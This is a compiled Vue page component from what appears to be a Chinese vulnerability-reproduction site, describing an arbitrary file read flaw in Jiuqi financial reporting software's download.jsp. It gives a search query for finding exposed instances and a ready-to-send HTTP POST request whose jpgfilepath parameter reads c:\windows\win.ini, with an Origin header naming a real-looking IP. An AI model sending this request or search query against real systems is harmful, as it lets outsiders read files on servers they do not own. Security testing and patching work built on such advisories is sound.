import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const d={},s=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>久其财务报表 download.jsp 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的信息</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>久其财务报表
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;/netrep/&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录路径如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101905343.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求包</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /netrep/ebook/browse/download.jsp HTTP/1.1
Host: 
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://114.251.113.53:7002
Content-Type: application/x-www-form-urlencoded

jpgfilepath=c:\\windows\\win.ini
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101905484.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),r=[s];function t(l,c){return a(),i("div",null,r)}const u=e(d,[["render",t],["__file","久其财务报表 download.jsp 任意文件读取漏洞.html.vue"]]);export{u as default};
